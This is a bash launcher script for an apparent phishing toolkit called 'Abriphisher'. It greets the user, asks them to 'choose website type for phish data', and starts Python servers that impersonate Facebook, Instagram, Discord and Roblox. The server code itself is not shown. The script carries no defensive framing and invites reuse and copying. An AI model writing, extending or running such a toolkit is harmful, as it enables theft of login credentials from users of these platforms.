#!/bin/bash 
# Hey! this program is 100% opensource. you can edit this code 
# if you want copy this code and add this to your own program
# please add credits to my github profile. Thanks!
clear

cat txts-assets/logo.txt
    echo 
    echo "Welcome in Abriphisher!"
    echo "choose website type for phish data"
cat txts-assets/menu.txt
    echo 
    read -p "$USER $ ->" ch 

case $ch in 
    c)
    echo -e "Credits"
    ;;
    1)
    echo -e "\e[32mStarting server.\e[0m"
python servers/test-phish.py
    ;;
    2) 
    echo -e "\e[32mStarting server.\e[0m"
python servers/facebook.py
    ;;
    3)
    echo -e "\e[32mStarting server.\e[0m"
python servers/instagram.py
    ;;
    5)
    echo -e "\e[32mStarting server.\e[0m"
python servers/roblox.py
    ;;
    4)
    echo -e "\e[32mStarting server.\e[0m"
python servers/discord.py
    ;;
    *)
    echo -e "\e[31mInvalid argument. choose number from menu\e[0m"
    ;;
esac 